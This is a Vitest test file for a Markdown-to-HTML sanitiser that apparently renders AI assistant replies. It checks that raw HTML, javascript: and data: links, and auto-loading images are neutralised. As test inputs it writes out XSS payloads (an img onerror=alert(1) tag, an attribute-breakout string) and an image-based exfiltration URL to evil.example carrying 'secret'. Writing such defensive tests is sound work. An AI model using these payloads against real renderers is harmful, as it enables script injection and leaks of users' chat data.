import { describe, expect, it } from "vitest";
import { markdownToHtml } from "../src/lib/md.ts";

describe("replies as safe HTML", () => {
  it("draws the usual Markdown", () => {
    expect(markdownToHtml("## Title\n\nSome **bold** and *it* and `x<y`.")).toBe(
      "<h4>Title</h4><p>Some <strong>bold</strong> and <em>it</em> and <code>x&lt;y</code>.</p>",
    );
    expect(markdownToHtml("- a\n- b\n\n1. one")).toBe(
      "<ul><li>a</li><li>b</li></ul><ol><li>one</li></ol>",
    );
    expect(markdownToHtml("```\n<b>\n```")).toBe("<pre><code>&lt;b&gt;</code></pre>");
    expect(markdownToHtml("| a | b |\n|---|---|\n| 1 | 2 |")).toContain("<td>1</td><td>2</td>");
  });

  it("never lets HTML or script links through", () => {
    const out = markdownToHtml(
      "<img src=x onerror=alert(1)> [x](javascript:alert(1)) ![y](data:image/png;base64,AA)",
    );
    expect(out).not.toContain("<img src=x");
    expect(out).not.toContain("javascript:");
    expect(out).not.toContain("data:image");
    expect(out).toContain("&lt;img");
  });

  it("links http(s) only, opening a new tab", () => {
    expect(markdownToHtml("[docs](https://docs.casama.ai/a?b=1&c=2)")).toBe(
      '<p><a href="https://docs.casama.ai/a?b=1&amp;c=2" target="_blank" rel="noopener noreferrer">docs</a></p>',
    );
    expect(markdownToHtml("see https://example.com/x.")).toContain('href="https://example.com/x"');
  });

  it("never loads a picture by itself, and nothing breaks out of an attribute", () => {
    const out = markdownToHtml(
      "![chart](https://evil.example/?d=secret) and ![ https://x/onerror=alert(1)// ](https://a.example)",
    );
    expect(out).not.toContain("<img");
    expect(out).toContain(
      '<a href="https://evil.example/?d=secret" target="_blank" rel="noopener noreferrer">Picture: chart</a>',
    );
    // The address inside the alt text stays text: one link per picture, no nested anchors.
    expect(out.match(/<a /g)).toHaveLength(2);
    expect(out).not.toMatch(/alt=|onerror="/);
  });

  it("keeps emphasis out of link addresses", () => {
    expect(markdownToHtml("[a](https://x.example/__init__) **b**")).toBe(
      '<p><a href="https://x.example/__init__" target="_blank" rel="noopener noreferrer">a</a> <strong>b</strong></p>',
    );
  });
});
